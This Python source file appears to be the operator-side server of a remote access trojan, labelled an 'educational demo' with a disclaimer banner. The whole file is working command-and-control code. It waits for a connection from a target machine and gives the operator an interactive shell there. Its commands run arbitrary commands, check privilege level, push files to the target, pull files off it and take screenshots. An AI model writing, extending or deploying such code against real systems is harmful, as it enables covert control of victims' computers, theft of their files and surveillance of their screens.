import socket
import os
import base64
import sys
from datetime import datetime
import argparse


def receive_all(sock, buffer_size=4096, end_marker=b"ENDOFFILE"):
    """
    Receive data until end marker is encountered.
    
    Args:
        sock: Socket connection
        buffer_size: Size of each chunk
        end_marker: Sequence indicating end of data
        
    Returns:
        bytes: Complete received data
    """
    data = b""
    while True:
        try:
            part = sock.recv(buffer_size)
            if not part:
                break
                
            if end_marker in part:
                # Find the exact position of the end marker
                marker_pos = part.find(end_marker)
                data += part[:marker_pos]
                break
                
            data += part
        except socket.timeout:
            # If we have a socket timeout, check if we have received anything
            if data:
                break
                
    return data


def print_banner():
    """Display initial banner with usage information."""
    banner = """
    ┌──────────────────────────────────────────────────┐
    │      Remote Access Tool - Educational Demo       │
    │                                                  │
    │  DISCLAIMER: For authorized use in controlled    │
    │  environments only. Unauthorized use is illegal. │
    └──────────────────────────────────────────────────┘
    """
    print(banner)


def print_help():
    """Print available commands and their usage."""
    help_text = """
Commands:
  help                    - Show this help menu
  pwd                     - Get current directory on target
  ls                      - List files on target
  cd <dir>                - Change directory on target
  checkadmin              - Check privilege level on target
  upload <local> <remote> - Send file to target
  download <remote> <local> - Get file from target
  screenshot              - Capture screenshot from target
  terminate               - Exit and close connection
  exit                    - Same as terminate
"""
    print(help_text)


def start_server(host="0.0.0.0", port=8080):
    """
    Start the server and handle client connections.
    
    Args:
        host: Interface to listen on (0.0.0.0 for all interfaces)
        port: Port number to listen on
    """
    print_banner()
    print(f"[+] Starting server on {host}:{port}...")
    
    try:
        # Create socket with timeout
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(1)
        
        print(f"[+] Listening for connections...")
        connection, address = server_socket.accept()
        connection.settimeout(5)  # Set timeout for operations
        
        print(f"[+] Connection established from {address[0]}:{address[1]}")
        
        # Receive and display initial system information
        initial_info = connection.recv(1024).decode()
        print(f"[*] {initial_info}")
        print("[+] Type 'help' to see available commands")
        
        handle_connection(connection)
        
    except socket.error as e:
        print(f"[!] Socket error: {e}")
    except KeyboardInterrupt:
        print("\n[!] Server terminated by user")
    finally:
        try:
            connection.close()
        except:
            pass
        try:
            server_socket.close()
        except:
            pass


def handle_connection(connection):
    """
    Handle commands for an established connection.
    
    Args:
        connection: Active socket connection to client
    """
    while True:
        try:
            command = input("\nShell > ").strip()
            
            # Handle empty commands
            if not command:
                continue
                
            # Handle local commands
            if command == "help":
                print_help()
                continue
                
            if command in ["exit", "terminate"]:
                print("[*] Terminating session...")
                connection.send("terminate".encode())
                break
                
            # Handle file upload
            elif command.startswith("upload "):
                parts = command.split(maxsplit=2)
                if len(parts) != 3:
                    print("[!] Usage: upload <local_file> <remote_path>")
                    continue
                    
                _, local_file, remote_path = parts
                
                if not os.path.exists(local_file):
                    print(f"[!] Local file not found: {local_file}")
                    continue
                    
                print(f"[*] Reading file: {local_file}")
                try:
                    with open(local_file, "rb") as f:
                        file_data = f.read()
                        
                    encoded = base64.b64encode(file_data).decode()
                    print(f"[*] Uploading {len(file_data)} bytes to {remote_path}")
                    connection.send(f"upload {remote_path} {encoded}".encode())
                    
                    response = connection.recv(1024).decode()
                    print(response)
                except Exception as e:
                    print(f"[!] Upload failed: {e}")
                    
            # Handle file download
            elif command.startswith("download "):
                parts = command.split(maxsplit=2)
                if len(parts) != 3:
                    print("[!] Usage: download <remote_file> <local_path>")
                    continue
                    
                _, remote_file, local_path = parts
                
                print(f"[*] Requesting file: {remote_file}")
                connection.send(f"download {remote_file}".encode())
                
                response = connection.recv(1024).decode()
                if response.startswith("[!]"):
                    print(response)
                    continue
                    
                print(f"[*] {response}")
                print("[*] Receiving data...")
                
                data = receive_all(connection)
                if not data:
                    print("[!] No data received")
                    continue
                    
                try:
                    decoded = base64.b64decode(data)
                    with open(local_path, "wb") as f:
                        f.write(decoded)
                    print(f"[+] File saved to {local_path} ({len(decoded)} bytes)")
                except Exception as e:
                    print(f"[!] Failed to save file: {e}")
                    
            # Handle screenshot
            elif command == "screenshot":
                print("[*] Requesting screenshot...")
                connection.send(command.encode())
                
                print("[*] Receiving screenshot data...")
                data = receive_all(connection)
                
                if not data:
                    print("[!] No screenshot data received")
                    continue
                    
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
                
                try:
                    with open(filename, "wb") as f:
                        f.write(data)
                    print(f"[+] Screenshot saved as {filename} ({len(data)} bytes)")
                except Exception as e:
                    print(f"[!] Failed to save screenshot: {e}")
                    
            # Handle all other commands
            else:
                connection.send(command.encode())
                try:
                    response = connection.recv(4096).decode()
                    print(response)
                except socket.timeout:
                    print("[!] Response timeout - command may still be running")
                    
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' or 'terminate' to close the connection")
        except ConnectionResetError:
            print("[!] Connection lost")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Remote Access Server - Educational Demo")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Port to listen on (default: 8080)")
    parser.add_argument("--host", default="0.0.0.0", help="Interface to listen on (default: 0.0.0.0)")
    
    args = parser.parse_args()
    start_server(host=args.host, port=args.port)